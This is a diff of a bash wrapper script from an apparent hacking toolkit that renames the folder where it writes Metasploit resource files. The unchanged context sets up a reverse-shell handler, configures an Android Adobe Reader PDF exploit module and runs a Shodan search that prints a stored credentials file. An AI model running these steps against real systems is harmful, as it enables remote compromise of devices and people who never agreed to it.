@@ -16,7 +16,7 @@ if [ ! -d $iHAKLAB/handler ]; then
 	mkdir -p $iHAKLAB/handler
 fi
 handlerRC(){
-cat <<- CONF > $iHAKLAB/msfilesRC/$OPTS.rc
+cat <<- CONF > $iHAKLAB/rcFiles/$OPTS.rc
 use exploit/multi/handler
 set PAYLOAD $PAYLOAD
 set LHOST $HOST
@@ -24,7 +24,7 @@ set LPORT $PORT
 run
 CONF
 	printf "$Y(_>)─➤$W HOST= $HOST\n$Y(_>)─➤$W PORT= $PORT\n$Y(_>)─➤$W Payload= $PAYLOAD\n$Y(_>)─➤$W Handler file= $OPTS.rc\n"
-	$user msfconsole -q -r $iHAKLAB/msfilesRC/$OPTS.rc
+	$user msfconsole -q -r $iHAKLAB/rcFiles/$OPTS.rc
 }
 
 case $1 in
@@ -39,7 +39,7 @@ case $1 in
 		handlerRC
 		;;
 	paypdf)
-		cat <<- CONF > $iHAKLAB/msfilesRC/$OPTS.rf
+		cat <<- CONF > $iHAKLAB/rcFiles/$OPTS.rf
 		use exploit/android/fileformat/adobe_reader_pdf_js_interface
 		set LHOST $HOST
 		set LPORT $PORT
@@ -50,7 +50,7 @@ case $1 in
 		set LPORT $LPORT
 		run
 		CONF
-		$user msfconsole -q -r $iHAKLAB/msfilesRC/$OPTS.rc
+		$user msfconsole -q -r $iHAKLAB/rcFiles/$OPTS.rc
 		;;
 	shodan)
 		if [ ! -e $MSFPATH/documentation/api/apikey ]; then
@@ -76,7 +76,7 @@ case $1 in
 		else
 			printf "$R(_>)─➤ ERROR :$W Not such query file\n"
 		fi
-		cat <<- CONF > $iHAKLAB/msfilesrc/$OPTS.rc
+		cat <<- CONF > $iHAKLAB/rcFiles/$OPTS.rc
 		use auxiliary/gather/shodan_search
 		set SHODAN_APIKEY $APIKEY
 		set QUERY "$QUERY"
@@ -86,6 +86,6 @@ case $1 in
 		cat $iHAKLAB/.set/shodan/usrpasswd.txt
 		printf "\n\tpress$G ENTER$W to continue\n"
 		read enter
-		msfconsole -q -r $iHAKLAB/msfilesrc/$OPTS.rc
+		msfconsole -q -r $iHAKLAB/rcFiles/$OPTS.rc
 		;;
 esac
